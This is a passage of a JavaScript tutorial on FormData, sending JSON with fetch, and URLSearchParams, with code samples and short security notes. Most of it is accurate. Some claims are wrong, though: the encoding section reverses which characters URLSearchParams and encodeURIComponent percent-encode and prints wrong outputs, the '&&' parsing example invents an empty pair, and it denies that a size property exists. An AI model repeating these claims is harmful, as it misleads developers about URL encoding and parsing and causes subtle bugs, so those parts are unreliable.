// Add fields based on conditions
const includeOptionalFields = true;

formData.append('required_field', 'value');

if (includeOptionalFields) {
  formData.append('optional_field', 'optional_value');
}

// Add array of values
const selectedItems = ['item1', 'item2', 'item3'];
selectedItems.forEach(item => {
  formData.append('items[]', item);
});

// Add nested data (server must parse)
const userData = { name: 'John', age: 30 };
formData.append('user', JSON.stringify(userData));
```

### Debugging FormData

**Logging Contents**

```javascript
function logFormData(formData) {
  console.log('FormData contents:');
  for (const [key, value] of formData.entries()) {
    if (value instanceof File) {
      console.log(`${key}: File(${value.name}, ${value.size} bytes, ${value.type})`);
    } else if (value instanceof Blob) {
      console.log(`${key}: Blob(${value.size} bytes, ${value.type})`);
    } else {
      console.log(`${key}: ${value}`);
    }
  }
}

const formData = new FormData(form);
logFormData(formData);
```

**Network Inspection**

Browser DevTools show FormData in the Network tab:

- Request payload shows individual form fields
- Files display with name, type, and size
- Preview tab shows parsed form data structure

### Security Considerations

**File Type Validation**

```javascript
const allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
const file = fileInput.files[0];

if (file && !allowedTypes.includes(file.type)) {
  console.error('Invalid file type');
  return;
}

// Note: Client-side validation is not sufficient
// Always validate on server (MIME type can be spoofed)
```

**File Size Validation**

```javascript
const maxSize = 5 * 1024 * 1024; // 5MB
const file = fileInput.files[0];

if (file && file.size > maxSize) {
  console.error('File too large');
  return;
}
```

**CSRF Protection**

```javascript
// Include CSRF token in FormData
const formData = new FormData(form);
const csrfToken = document.querySelector('meta[name="csrf-token"]').content;
formData.append('_csrf', csrfToken);

fetch('/api/submit', {
  method: 'POST',
  body: formData,
  credentials: 'same-origin' // Include cookies
});
```

**Content Sanitization**

[Inference] FormData itself doesn't sanitize input. Server-side validation and sanitization are essential:

- Validate field names and values
- Check file MIME types and content (not just extension)
- Scan uploaded files for malware
- Limit file sizes and number of files
- Validate image dimensions for image uploads

### Browser Compatibility

FormData API is widely supported in modern browsers. Key features and their support:

- Basic FormData: All modern browsers
- `FormData(form)` constructor: All modern browsers
- Iteration methods (`entries()`, `keys()`, `values()`): All modern browsers
- `set()` method: All modern browsers
- Second parameter of `FormData(form, submitter)`: [Inference] Supported in recent browser versions, but may not be available in older browsers

For legacy browser support, polyfills are available for iteration methods.

---

## JSON Payloads in Fetch Context

### Basic JSON Request

The Fetch API sends JSON by serializing JavaScript objects and setting the appropriate content type.

**Standard pattern:**

```javascript
fetch('https://api.example.com/users', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    name: 'John Doe',
    email: 'john@example.com',
    age: 30
  })
})
```

**Critical requirement:** The `body` must be a string. `JSON.stringify()` converts JavaScript objects to JSON strings.

**Common error:**

```javascript
// INCORRECT - will fail or send "[object Object]"
body: { name: 'John' }

// CORRECT
body: JSON.stringify({ name: 'John' })
```

### Response Parsing

**Standard response handling:**

```javascript
fetch('https://api.example.com/users/123')
  .then(response => response.json())
  .then(data => {
    console.log(data.name);
  })
```

**The `.json()` method:**

- Returns a Promise
- Parses response body as JSON
- Throws on invalid JSON
- Consumes the response stream (can only be called once)

**Error handling for invalid JSON:**

```javascript
fetch('https://api.example.com/data')
  .then(response => {
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    return response.json();
  })
  .then(data => console.log(data))
  .catch(error => {
    // Could be network error, HTTP error, or JSON parsing error
    console.error('Error:', error);
  });
```

### Content-Type Header Behavior

**Automatic vs manual setting:**

```javascript
// Fetch does NOT automatically set Content-Type for JSON
fetch(url, {
  method: 'POST',
  body: JSON.stringify(data)
  // Content-Type header NOT set - server may reject request
})

// Must explicitly set Content-Type
fetch(url, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify(data)
})
```

**Server expectations:** Most REST APIs require the `Content-Type: application/json` header. Without it:

- Some servers return 415 Unsupported Media Type
- Some servers accept but misparse the data
- Some servers default to JSON parsing

[Inference: Server behavior varies by framework and configuration. Best practice is always explicitly setting Content-Type.]

### Handling Different Data Types

#### Strings

```javascript
body: JSON.stringify({ message: "Hello world" })
// Result: {"message":"Hello world"}
```

#### Numbers

```javascript
body: JSON.stringify({ age: 30, price: 19.99 })
// Result: {"age":30,"price":19.99}
```

#### Booleans

```javascript
body: JSON.stringify({ active: true, verified: false })
// Result: {"active":true,"verified":false}
```

#### Null

```javascript
body: JSON.stringify({ middleName: null })
// Result: {"middleName":null}
```

#### Undefined Behavior

```javascript
body: JSON.stringify({ name: "John", nickname: undefined })
// Result: {"name":"John"}
// undefined values are OMITTED
```

#### Arrays

```javascript
body: JSON.stringify({ tags: ['javascript', 'fetch', 'api'] })
// Result: {"tags":["javascript","fetch","api"]}
```

#### Nested Objects

```javascript
body: JSON.stringify({
  user: {
    name: 'John',
    address: {
      city: 'New York',
      zip: '10001'
    }
  }
})
```

#### Dates

```javascript
const data = { created: new Date('2024-01-15') };
body: JSON.stringify(data)
// Result: {"created":"2024-01-15T00:00:00.000Z"}
// Dates serialize to ISO 8601 strings
```

**Parsing dates on response:**

```javascript
fetch(url)
  .then(res => res.json())
  .then(data => {
    // data.created is a STRING, not a Date object
    const dateObj = new Date(data.created);
  })
```

### Special JSON.stringify Behaviors

#### The Replacer Parameter

```javascript
// Filter which properties to include
JSON.stringify(obj, ['name', 'email'])

// Transform values during serialization
JSON.stringify(obj, (key, value) => {
  if (key === 'password') return undefined; // Omit passwords
  return value;
})
```

#### The Space Parameter

```javascript
// Pretty-print for debugging (not for production requests)
JSON.stringify(data, null, 2)
```

**Production usage:** Always use `JSON.stringify(data)` without spacing to minimize payload size.

#### toJSON Method

Objects can define custom JSON serialization:

```javascript
class User {
  constructor(name, password) {
    this.name = name;
    this.password = password;
  }
  
  toJSON() {
    return { name: this.name }; // Exclude password
  }
}

const user = new User('John', 'secret123');
JSON.stringify(user)
// Result: {"name":"John"}
```

### Request Body Size Considerations

**Browser limits:** [Inference: Most browsers impose memory-based limits on request bodies, typically in the range of hundreds of MB to several GB, though practical limits are lower due to performance degradation.]

**Server limits:** Commonly configured to reject bodies exceeding:

- 1-2 MB for typical API requests
- 10-50 MB for file upload endpoints
- Configurable per-endpoint

**Checking payload size:**

```javascript
const payload = JSON.stringify(data);
const sizeInBytes = new Blob([payload]).size;
const sizeInKB = sizeInBytes / 1024;

if (sizeInKB > 1024) {
  console.warn('Payload exceeds 1MB');
}
```

**Optimization strategies:**

- Pagination for large datasets
- Field filtering (sparse fieldsets)
- Compression (not directly in fetch, but server-side with Content-Encoding)
- Chunked requests for bulk operations

### Error Handling Patterns

#### Checking Response Status Before Parsing

```javascript
fetch(url, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify(data)
})
.then(response => {
  if (!response.ok) {
    // Response body might still contain JSON error details
    return response.json().then(err => {
      throw new Error(err.message || `HTTP ${response.status}`);
    }).catch(() => {
      // JSON parsing failed, use status text
      throw new Error(`HTTP ${response.status}: ${response.statusText}`);
    });
  }
  return response.json();
})
.then(data => console.log('Success:', data))
.catch(error => console.error('Error:', error));
```

#### Handling Non-JSON Responses

```javascript
fetch(url)
  .then(response => {
    const contentType = response.headers.get('content-type');
    if (contentType && contentType.includes('application/json')) {
      return response.json();
    }
    // Server sent non-JSON response
    return response.text().then(text => {
      throw new Error(`Expected JSON, got: ${text}`);
    });
  })
```

#### Empty Response Bodies

```javascript
fetch(url, { method: 'DELETE' })
  .then(response => {
    if (response.status === 204) {
      // No Content - don't try to parse JSON
      return null;
    }
    return response.json();
  })
```

### Advanced Request Patterns

#### Conditional Requests

```javascript
fetch(url, {
  method: 'PUT',
  headers: {
    'Content-Type': 'application/json',
    'If-Match': '"etag-value"' // Optimistic locking
  },
  body: JSON.stringify(data)
})
```

#### Partial Updates (PATCH)

```javascript
// Send only changed fields
fetch(`https://api.example.com/users/${userId}`, {
  method: 'PATCH',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    email: 'newemail@example.com'
    // Other fields unchanged
  })
})
```

#### Batch Requests

```javascript
// Some APIs support batching multiple operations
fetch('https://api.example.com/batch', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    operations: [
      { method: 'POST', path: '/users', body: { name: 'User 1' } },
      { method: 'POST', path: '/users', body: { name: 'User 2' } },
      { method: 'GET', path: '/users/123' }
    ]
  })
})
```

### CORS and JSON Requests

**Preflight triggers:** Complex JSON requests trigger CORS preflight (OPTIONS request) when:

- Using methods other than GET, POST, HEAD
- Including custom headers beyond simple headers
- Content-Type is `application/json` (not a simple content type)

**Simple vs preflighted:**

```javascript
// Triggers preflight (application/json is not simple)
fetch(url, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify(data)
})

// Also triggers preflight (custom header)
fetch(url, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-Custom-Header': 'value'
  },
  body: JSON.stringify(data)
})
```

**Server CORS requirements for JSON APIs:**

```
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: POST, PUT, PATCH, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400
```

### Credentials and Authentication

#### Including Authentication Headers

```javascript
fetch(url, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer ' + token
  },
  body: JSON.stringify(data)
})
```

#### Cookies with Credentials

```javascript
fetch(url, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify(data),
  credentials: 'include' // Send cookies cross-origin
})
```

**CORS requirements with credentials:**

- Server must respond with `Access-Control-Allow-Credentials: true`
- `Access-Control-Allow-Origin` cannot be `*` (must be specific origin)

### Streaming and Large Payloads

**Standard fetch limitation:** The entire body must be in memory before sending.

**Workaround for large data:**

```javascript
// Break into smaller requests
const chunks = largeArray.reduce((acc, item, idx) => {
  const chunkIdx = Math.floor(idx / 100);
  if (!acc[chunkIdx]) acc[chunkIdx] = [];
  acc[chunkIdx].push(item);
  return acc;
}, []);

for (const chunk of chunks) {
  await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(chunk)
  });
}
```

**ReadableStream for request bodies:** Newer browsers support streaming request bodies:

```javascript
const stream = new ReadableStream({
  start(controller) {
    // Push chunks
    controller.enqueue(new TextEncoder().encode(JSON.stringify(chunk1)));
    controller.enqueue(new TextEncoder().encode(JSON.stringify(chunk2)));
    controller.close();
  }
});

fetch(url, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: stream,
  duplex: 'half' // Required for streaming requests
})
```

[Unverified: Browser support for streaming request bodies varies. Not all browsers support duplex streams.]

### Response Streaming

**Reading JSON responses incrementally:**

```javascript
const response = await fetch(url);
const reader = response.body.getReader();
const decoder = new TextDecoder();
let buffer = '';

while (true) {
  const { done, value } = await reader.read();
  
  if (done) break;
  
  buffer += decoder.decode(value, { stream: true });
  
  // Attempt to parse complete JSON objects from buffer
  // (Requires NDJSON or similar line-delimited format)
  const lines = buffer.split('\n');
  buffer = lines.pop(); // Keep incomplete line in buffer
  
  for (const line of lines) {
    if (line.trim()) {
      const jsonObj = JSON.parse(line);
      console.log('Received:', jsonObj);
    }
  }
}
```

### JSON Parsing Edge Cases

#### Large Numbers

```javascript
const data = { bigNumber: 9007199254740992 }; // Beyond safe integer
fetch(url, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify(data)
})
// Loss of precision possible for integers > 2^53 - 1
```

**Mitigation:** Send large numbers as strings:

```javascript
body: JSON.stringify({ bigNumber: "9007199254740992" })
```

#### Circular References

```javascript
const obj = { name: 'John' };
obj.self = obj; // Circular reference

JSON.stringify(obj)
// Throws: TypeError: Converting circular structure to JSON
```

**Detection before serialization:**

```javascript
function hasCircularReference(obj, seen = new WeakSet()) {
  if (obj !== null && typeof obj === 'object') {
    if (seen.has(obj)) return true;
    seen.add(obj);
    for (let key in obj) {
      if (hasCircularReference(obj[key], seen)) return true;
    }
  }
  return false;
}
```

#### Symbol Properties

```javascript
const obj = { name: 'John', [Symbol('id')]: 123 };
JSON.stringify(obj)
// Result: {"name":"John"}
// Symbol properties are IGNORED
```

#### Function Properties

```javascript
const obj = { name: 'John', greet: function() { return 'Hello'; } };
JSON.stringify(obj)
// Result: {"name":"John"}
// Function properties are OMITTED
```

### Content Negotiation

**Requesting JSON responses:**

```javascript
fetch(url, {
  headers: {
    'Accept': 'application/json'
  }
})
```

**Handling multiple possible response formats:**

```javascript
fetch(url, {
  headers: {
    'Accept': 'application/json, application/xml;q=0.9'
  }
})
.then(response => {
  const contentType = response.headers.get('content-type');
  if (contentType.includes('application/json')) {
    return response.json();
  } else if (contentType.includes('application/xml')) {
    return response.text(); // Parse XML separately
  }
})
```

### Abort Controllers and Timeouts

**Aborting JSON requests:**

```javascript
const controller = new AbortController();

fetch(url, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify(data),
  signal: controller.signal
})
.catch(error => {
  if (error.name === 'AbortError') {
    console.log('Request aborted');
  }
});

// Abort after timeout
setTimeout(() => controller.abort(), 5000);
```

**Request timeout wrapper:**

```javascript
function fetchWithTimeout(url, options, timeout = 5000) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), timeout);
  
  return fetch(url, {
    ...options,
    signal: controller.signal
  }).finally(() => {
    clearTimeout(timeoutId);
  });
}

fetchWithTimeout(url, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify(data)
}, 10000)
```

### Performance Optimization

#### Reusing Headers Objects

```javascript
const jsonHeaders = new Headers({
  'Content-Type': 'application/json',
  'Accept': 'application/json'
});

// Reuse for multiple requests
fetch(url1, { method: 'POST', headers: jsonHeaders, body: JSON.stringify(data1) });
fetch(url2, { method: 'POST', headers: jsonHeaders, body: JSON.stringify(data2) });
```

#### Caching Serialized Payloads

```javascript
// Avoid repeated serialization
const serializedData = JSON.stringify(largeObject);

// Use same serialized string for multiple requests
fetch(url1, { method: 'POST', headers: jsonHeaders, body: serializedData });
fetch(url2, { method: 'POST', headers: jsonHeaders, body: serializedData });
```

#### HTTP Caching for GET Requests

```javascript
fetch(url, {
  headers: { 'Accept': 'application/json' },
  cache: 'default' // Use browser cache
})
```

**Cache modes:**

- `default`: Standard cache behavior
- `no-store`: Bypass cache completely
- `reload`: Bypass cache, update cache with response
- `no-cache`: Validate with server before using cached response
- `force-cache`: Use cache if available, even if stale
- `only-if-cached`: Use only cached response, fail if not cached

### Request Cloning

**Cloning for retry logic:**

```javascript
async function fetchWithRetry(url, options, retries = 3) {
  for (let i = 0; i < retries; i++) {
    try {
      const response = await fetch(url, options);
      if (response.ok) return response;
    } catch (error) {
      if (i === retries - 1) throw error;
      await new Promise(resolve => setTimeout(resolve, 1000 * (i + 1)));
    }
  }
}
```

**Body consumption limitation:** Request bodies can only be read once. For retry scenarios, store the serialized body:

```javascript
const body = JSON.stringify(data);

async function attemptRequest() {
  return fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: body // Reuse string
  });
}
```

### Security Considerations

#### Sensitive Data in Requests

```javascript
// AVOID: Logging full request bodies
console.log('Sending:', JSON.stringify(data));

// BETTER: Log without sensitive fields
const safeData = { ...data };
delete safeData.password;
delete safeData.creditCard;
console.log('Sending:', JSON.stringify(safeData));
```

#### Response Size Validation

```javascript
fetch(url)
  .then(response => {
    const contentLength = response.headers.get('content-length');
    if (contentLength && parseInt(contentLength) > 5000000) {
      throw new Error('Response too large');
    }
    return response.json();
  })
```

#### JSON Injection Protection

Server-side concern primarily, but clients should validate response structure:

```javascript
fetch(url)
  .then(res => res.json())
  .then(data => {
    // Validate expected structure
    if (typeof data.id !== 'number' || typeof data.name !== 'string') {
      throw new Error('Invalid response structure');
    }
    // Use data
  })
```

### Browser Compatibility

**Fetch API support:** Modern browsers (2015+). For older browsers, polyfills required.

**JSON methods:** `JSON.stringify()` and `JSON.parse()` have near-universal support (IE8+).

**Modern features with limited support:**

- Streaming request bodies: Limited browser support
- `keepalive` option: Not supported in all browsers
- `duplex` option: Required for streaming, new feature

[Unverified: Exact browser version requirements vary. Check compatibility tables for production use.]

---

## URLSearchParams

### Interface Overview

URLSearchParams provides a dedicated API for manipulating URL query strings, replacing manual string parsing and concatenation. The interface operates on key-value pairs representing query parameters, handling encoding, serialization, and multi-value scenarios automatically.

The constructor accepts multiple input formats: query strings (with or without the leading `?`), objects with string properties, arrays of `[key, value]` tuples, or existing URLSearchParams instances for cloning.

```javascript
// From query string
const params1 = new URLSearchParams('?name=value&another=test');
const params2 = new URLSearchParams('name=value&another=test'); // Leading ? optional

// From object
const params3 = new URLSearchParams({
  name: 'value',
  another: 'test'
});

// From array of pairs
const params4 = new URLSearchParams([
  ['name', 'value'],
  ['another', 'test']
]);

// From existing URLSearchParams
const params5 = new URLSearchParams(params1);
```

URLSearchParams instances are mutable—all modification methods alter the object in place rather than returning new instances.

### Core Manipulation Methods

The `append(name, value)` method adds a parameter without removing existing parameters with the same name, enabling multiple values per key. Parameters append in the order they're added.

```javascript
const params = new URLSearchParams();
params.append('tag', 'javascript');
params.append('tag', 'web');
params.append('tag', 'api');
// Results in: tag=javascript&tag=web&tag=api
```

The `set(name, value)` method replaces all existing parameters with the given name, ensuring exactly one value exists for that key. If multiple values existed, all are removed and replaced with the single new value.

```javascript
params.set('tag', 'tutorial');
// Now: tag=tutorial (previous values removed)
```

The `delete(name)` method removes all parameters matching the name, regardless of how many values exist.

```javascript
params.delete('tag');
// All 'tag' parameters removed
```

The `delete(name, value)` overload (added in more recent specifications) removes only parameters matching both name and value, preserving other values for the same name:

```javascript
params.append('color', 'red');
params.append('color', 'blue');
params.append('color', 'green');
params.delete('color', 'blue');
// Results in: color=red&color=green
```

[Unverified] The two-argument `delete()` overload may have limited browser support as of late 2024—checking compatibility is advisable.

### Retrieval Methods

The `get(name)` method returns the first value associated with the parameter name, or `null` if the parameter doesn't exist.

```javascript
params.append('status', 'active');
params.append('status', 'pending');
console.log(params.get('status')); // 'active'
console.log(params.get('missing')); // null
```

The `getAll(name)` method returns an array of all values for the parameter, returning an empty array if the parameter doesn't exist.

```javascript
console.log(params.getAll('status')); // ['active', 'pending']
console.log(params.getAll('missing')); // []
```

The `has(name)` method checks parameter existence without retrieving values, returning a boolean.

```javascript
if (params.has('status')) {
  // Parameter exists with at least one value
}
```

The `has(name, value)` overload (added in more recent specifications) checks whether a specific name-value pair exists:

```javascript
params.has('status', 'active'); // true
params.has('status', 'completed'); // false
```

[Unverified] The two-argument `has()` overload may have limited browser support as of late 2024.

### Iteration and Enumeration

URLSearchParams implements the iterable protocol, making instances directly iterable with `for...of` loops. Iteration yields `[name, value]` pairs in insertion order.

```javascript
const params = new URLSearchParams('a=1&b=2&a=3');
for (const [key, value] of params) {
  console.log(`${key} = ${value}`);
}
// Output:
// a = 1
// b = 2
// a = 3
```

The `entries()` method returns an iterator of `[name, value]` pairs, equivalent to the default iteration:

```javascript
for (const [key, value] of params.entries()) {
  // Same as direct iteration
}
```

The `keys()` method returns an iterator of parameter names, including duplicates for repeated parameters:

```javascript
const params = new URLSearchParams('a=1&b=2&a=3');
for (const key of params.keys()) {
  console.log(key);
}
// Output: a, b, a (duplicates included)
```

The `values()` method returns an iterator of parameter values in order:

```javascript
for (const value of params.values()) {
  console.log(value);
}
// Output: 1, 2, 3
```

The `forEach(callback)` method provides callback-based iteration, invoking the callback with `(value, key, params)` arguments:

```javascript
params.forEach((value, key) => {
  console.log(`${key} = ${value}`);
});
```

The parameter order follows the Map convention where value precedes key in the callback signature, despite the reversed order in array destructuring.

### Serialization

The `toString()` method serializes parameters to a query string without the leading `?` character. The method applies percent-encoding to names and values according to the `application/x-www-form-urlencoded` specification.

```javascript
const params = new URLSearchParams();
params.set('search', 'hello world');
params.set('category', 'news & updates');
console.log(params.toString());
// 'search=hello+world&category=news+%26+updates'
```

Serialization maintains the parameter order established through `append()` and `set()` operations. Empty values serialize as name-only with an equals sign:

```javascript
params.set('empty', '');
console.log(params.toString()); // 'empty='
```

Parameters with `undefined` or `null` values convert to the strings `'undefined'` and `'null'`:

```javascript
params.set('undef', undefined);
params.set('nothing', null);
console.log(params.toString());
// 'undef=undefined&nothing=null'
```

[Inference] This string conversion of undefined and null may cause unexpected behavior—filtering these values before setting parameters prevents unintended serialization.

The serialized output doesn't include the `?` prefix, requiring manual addition when constructing complete URLs:

```javascript
const url = `https://example.com/search?${params.toString()}`;
```

### Encoding Behavior

URLSearchParams applies `application/x-www-form-urlencoded` encoding, which differs from standard percent-encoding in several ways. Spaces encode as `+` characters rather than `%20`:

```javascript
const params = new URLSearchParams();
params.set('name', 'first last');
console.log(params.toString()); // 'name=first+last'
```

The encoding targets the serialized output—accessing values through `get()` returns decoded strings with spaces, not plus signs:

```javascript
console.log(params.get('name')); // 'first last'
```

Reserved characters in parameter names and values receive percent-encoding:

```javascript
params.set('key&special', 'value=test');
console.log(params.toString());
// 'key%26special=value%3Dtest'
```

Non-ASCII characters encode as UTF-8 byte sequences with each byte percent-encoded:

```javascript
params.set('name', '日本語');
console.log(params.toString());
// 'name=%E6%97%A5%E6%9C%AC%E8%AA%9E'
```

The encoding differs from `encodeURIComponent()`, which follows RFC 3986 and encodes spaces as `%20`. Characters like `!`, `'`, `(`, `)`, `*`, and `~` remain unencoded in URLSearchParams but encode with `encodeURIComponent()`:

```javascript
params.set('special', "it's (really) ok!");
console.log(params.toString());
// "special=it's+(really)+ok!"

console.log(encodeURIComponent("it's (really) ok!"));
// "it's%20%28really%29%20ok%21"
```

### Parameter Ordering

URLSearchParams preserves insertion order for parameters. The order reflects the sequence of `append()` and `set()` calls:

```javascript
const params = new URLSearchParams();
params.append('z', '1');
params.append('a', '2');
params.append('m', '3');
console.log(params.toString()); // 'z=1&a=2&m=3'
```

The `sort()` method arranges parameters alphabetically by name, modifying the instance in place:

```javascript
params.sort();
console.log(params.toString()); // 'a=2&m=3&z=1'
```

Parameters with the same name remain grouped together after sorting, maintaining their relative order:

```javascript
params.append('a', '4');
params.sort();
console.log(params.toString()); // 'a=2&a=4&m=3&z=1'
```

Sorting enables consistent URL generation for cache keys or canonical URLs where parameter order shouldn't affect equivalence:

```javascript
function normalizeUrl(url) {
  const parsed = new URL(url);
  parsed.searchParams.sort();
  return parsed.toString();
}
```

### Multi-Value Parameters

URLSearchParams natively supports multiple values per parameter name through repeated `append()` calls. This design accommodates array-like parameters common in REST APIs:

```javascript
const params = new URLSearchParams();
params.append('filter', 'active');
params.append('filter', 'verified');
params.append('filter', 'premium');
// Results in: filter=active&filter=verified&filter=premium
```

Retrieving all values requires `getAll()`, which returns an array:

```javascript
const filters = params.getAll('filter');
// ['active', 'verified', 'premium']
```

Using `get()` returns only the first value:

```javascript
const firstFilter = params.get('filter'); // 'active'
```

The `set()` method replaces all existing values, useful for resetting a parameter:

```javascript
params.set('filter', 'newValue');
console.log(params.getAll('filter')); // ['newValue']
```

Removing individual values while preserving others requires the two-argument `delete()` overload or manual reconstruction:

```javascript
// Manual approach (universal compatibility)
const values = params.getAll('filter').filter(v => v !== 'verified');
params.delete('filter');
values.forEach(v => params.append('filter', v));
```

### Constructor Input Handling

When constructing from objects, only own enumerable string properties are considered. Non-string values convert to strings:

```javascript
const params = new URLSearchParams({
  string: 'text',
  number: 42,
  boolean: true,
  object: { nested: 'value' }
});

console.log(params.get('number')); // '42'
console.log(params.get('boolean')); // 'true'
console.log(params.get('object')); // '[object Object]'
```

[Inference] Object values serialize via `toString()`, typically producing `'[object Object]'` for plain objects—this behavior is rarely useful, suggesting explicit serialization before construction.

Arrays in object values don't automatically expand to multiple parameters:

```javascript
const params = new URLSearchParams({
  tags: ['js', 'web', 'api']
});
console.log(params.get('tags')); // 'js,web,api' (joined, not separate)
```

Proper multi-value handling requires array-of-pairs construction or explicit appending:

```javascript
const tags = ['js', 'web', 'api'];
const params = new URLSearchParams(
  tags.map(tag => ['tags', tag])
);
```

When constructing from strings, the leading `?` is automatically stripped if present:

```javascript
const params1 = new URLSearchParams('?a=1&b=2');
const params2 = new URLSearchParams('a=1&b=2');
// Both produce identical results
```

Malformed query strings parse permissively. Missing values default to empty strings:

```javascript
const params = new URLSearchParams('key1&key2=value2');
console.log(params.get('key1')); // ''
console.log(params.get('key2')); // 'value2'
```

### Size and Content Checking

URLSearchParams provides no direct `size` or `length` property. Counting parameters requires iteration:

```javascript
function countParams(params) {
  let count = 0;
  for (const _ of params) count++;
  return count;
}

// Or using Array conversion
const count = Array.from(params).length;
```

Checking for empty parameter sets:

```javascript
function isEmpty(params) {
  for (const _ of params) return false;
  return true;
}

// Or checking serialization
const isEmpty = params.toString() === '';
```

Getting unique parameter names requires deduplication:

```javascript
function getUniqueKeys(params) {
  return [...new Set(params.keys())];
}
```

Counting values per parameter:

```javascript
function countValues(params, name) {
  return params.getAll(name).length;
}
```

### Integration with Fetch API

URLSearchParams integrates directly with fetch for POST requests with form-encoded bodies. Passing a URLSearchParams instance as the body automatically sets the `Content-Type` header to `application/x-www-form-urlencoded`:

```javascript
const params = new URLSearchParams();
params.set('username', 'user123');
params.set('password', 'secret');

fetch('/login', {
  method: 'POST',
  body: params
  // Content-Type automatically set
});
```

For GET requests, URLSearchParams constructs query strings:

```javascript
const params = new URLSearchParams({
  search: 'javascript',
  limit: '10'
});

fetch(`/api/search?${params.toString()}`);
```

Combining base URLs with parameters:

```javascript
const url = new URL('https://api.example.com/search');
url.search = params.toString();
fetch(url);
```

### Case Sensitivity

Parameter names are case-sensitive. Parameters differing only in case are distinct:

```javascript
params.set('Name', 'value1');
params.set('name', 'value2');
console.log(params.get('Name')); // 'value1'
console.log(params.get('name')); // 'value2'
console.log(params.toString()); // 'Name=value1&name=value2'
```

This differs from HTTP header behavior where header names are case-insensitive. Server-side frameworks may normalize parameter names, but URLSearchParams preserves exact casing.

### Comparison and Equality

URLSearchParams instances don't provide built-in equality comparison. Two instances with identical parameters aren't considered equal:

```javascript
const params1 = new URLSearchParams('a=1&b=2');
const params2 = new URLSearchParams('a=1&b=2');
console.log(params1 === params2); // false
```

Comparing parameter sets requires serialization comparison:

```javascript
function paramsEqual(p1, p2) {
  return p1.toString() === p2.toString();
}
```

This comparison is order-sensitive. For order-independent comparison, sort before comparing:

```javascript
function paramsEqualUnordered(p1, p2) {
  const c1 = new URLSearchParams(p1);
  const c2 = new URLSearchParams(p2);
  c1.sort();
  c2.sort();
  return c1.toString() === c2.toString();
}
```

### Cloning and Immutability

URLSearchParams instances are mutable. Creating independent copies requires explicit cloning through the constructor:

```javascript
const original = new URLSearchParams('a=1&b=2');
const copy = new URLSearchParams(original);

copy.set('c', '3');
console.log(original.toString()); // 'a=1&b=2' (unchanged)
console.log(copy.toString()); // 'a=1&b=2&c=3'
```

Functional approaches to parameter building maintain immutability:

```javascript
function withParam(params, key, value) {
  const newParams = new URLSearchParams(params);
  newParams.set(key, value);
  return newParams;
}

function withoutParam(params, key) {
  const newParams = new URLSearchParams(params);
  newParams.delete(key);
  return newParams;
}
```

Chaining immutable operations:

```javascript
const params = new URLSearchParams();
const final = [
  ['a', '1'],
  ['b', '2'],
  ['c', '3']
].reduce((p, [k, v]) => withParam(p, k, v), params);
```

### Parsing Edge Cases

URLSearchParams handles various edge cases in query string parsing:

**Empty parameters:**

```javascript
const params = new URLSearchParams('a=&b=value');
console.log(params.get('a')); // '' (empty string)
console.log(params.has('a')); // true
```

**Parameters without equals signs:**

```javascript
const params = new URLSearchParams('flag&other=value');
console.log(params.get('flag')); // '' (empty string)
console.log(params.has('flag')); // true
```

**Repeated equals signs:**

```javascript
const params = new URLSearchParams('key=value=extra');
console.log(params.get('key')); // 'value=extra'
```

**Empty query strings:**

```javascript
const params = new URLSearchParams('');
console.log(params.toString()); // '' (empty)
for (const _ of params) {} // No iterations
```

**Ampersand sequences:**

```javascript
const params = new URLSearchParams('a=1&&b=2');
// Empty parameter created between ampersands
console.log(Array.from(params)); // [['a','1'], ['',''], ['b','2']]
```

### Conversion to Other Formats

Converting URLSearchParams to plain objects requires explicit iteration, as no built-in method exists:

```javascript
function toObject(params) {
  const obj = {};
  for (const [key, value] of params) {
    if (obj[key]) {
      // Handle multi-value parameters
      if (Array.isArray(obj[key])) {
        obj[key].push(value);
      } else {
        obj[key] = [obj[key], value];
      }
    } else {
      obj[key] = value;
    }
  }
  return obj;
}
```

Simpler conversion that keeps only first values:

```javascript
function toSimpleObject(params) {
  const obj = {};
  for (const [key, value] of params) {
    if (!(key in obj)) {
      obj[key] = value;
    }
  }
  return obj;
}
```

Converting to JSON requires serialization to object first:

```javascript
const jsonString = JSON.stringify(toObject(params));
```

Converting to Map structures:

```javascript
// Single-value Map
const map = new Map(params);

// Multi-value Map
const multiMap = new Map();
for (const [key, value] of params) {
  if (!multiMap.has(key)) {
    multiMap.set(key, []);
  }
  multiMap.get(key).push(value);
}
```

### Working with FormData

Converting between URLSearchParams and FormData enables different encoding strategies. URLSearchParams uses `application/x-www-form-urlencoded`, while FormData uses `multipart/form-data`.

**URLSearchParams to FormData:**

```javascript
const params = new URLSearchParams('name=value&other=test');
const formData = new FormData();
for (const [key, value] of params) {
  formData.append(key, value);
}
```

**FormData to URLSearchParams:**

```javascript
const formData = new FormData();
formData.append('name', 'value');
formData.append('file', fileBlob);

const params = new URLSearchParams();
for (const [key, value] of formData) {
  // Only string values convert cleanly
  if (typeof value === 'string') {
    params.append(key, value);
  }
}
```

[Inference] File objects in FormData don't convert to URLSearchParams since binary data isn't representable in URL-encoded format. The conversion only preserves text fields.

### Performance Considerations

